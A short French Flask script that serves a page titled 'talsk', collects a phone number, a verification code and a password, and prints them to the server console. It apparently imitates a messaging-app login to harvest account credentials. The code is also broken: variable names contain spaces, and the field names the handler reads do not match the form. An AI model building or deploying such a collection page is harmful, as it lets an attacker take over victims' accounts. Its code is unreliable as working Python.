from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def accueil():
    return """
    <h1>talsk</h1>

    <form method="POST" action="/recevoir">
        <input name="message1" placeholder="numéro de téléphone">
        <input name="message2" placeholder="code">
        <input name="message3" placeholder="mot de passe">

        <button type="submit">Envoyer</button>
    </form>
    """

@app.route("/recevoir", methods=["POST"])
def recevoir():
    numéro de téléphone = request.form.get("numéro de téléphone")
    code = request.form.get("code")
    mot de passe = request.form.get("mot de passe")

    print("numéro de téléphone:", numéro de téléphone)
    print("code:", code)
    print("mot de passe :", mot de passe)
    
    return "les 3 messages on etait recu"
